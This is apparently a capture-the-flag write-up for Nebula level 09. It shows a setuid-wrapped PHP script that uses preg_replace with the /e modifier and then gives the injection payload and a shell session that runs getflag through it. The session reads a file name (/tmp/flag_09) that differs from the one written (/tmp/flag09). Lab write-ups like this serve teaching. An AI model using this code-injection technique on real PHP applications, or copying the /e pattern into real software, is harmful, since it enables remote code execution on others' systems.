# Nebula - Level 09

### About ###

>There’s a C setuid wrapper for some vulnerable PHP code…
>
>To do this level, log in as the level09 account with the password level09. Files for this level can be found in /home/flag09.

### Source code ###

```php
<?php

function spam($email)
{
  $email = preg_replace("/\./", " dot ", $email);
  $email = preg_replace("/@/", " AT ", $email);
  
  return $email;
}

function markup($filename, $use_me)
{
  $contents = file_get_contents($filename);

  $contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
  $contents = preg_replace("/\[/", "<", $contents);
  $contents = preg_replace("/\]/", ">", $contents);

  return $contents;
}

$output = markup($argv[1], $argv[2]);

print $output;

?>
```

### Solution ###

The `/e` in `preg_replace` allows users to execute PHP code passed in the second argument.

The exploitation is pretty straightforward by using a file containing a string formatted as follow.

```
[email {${eval(system(`getflag>/tmp/flag09`))}}]
```

`getflag` can now be executed.

```
level09@nebula:/home/flag09$ ./flag09 /tmp/email
level09@nebula:/home/flag09$ cat /tmp/flag_09
You have successfully executed getflag on a target account
```
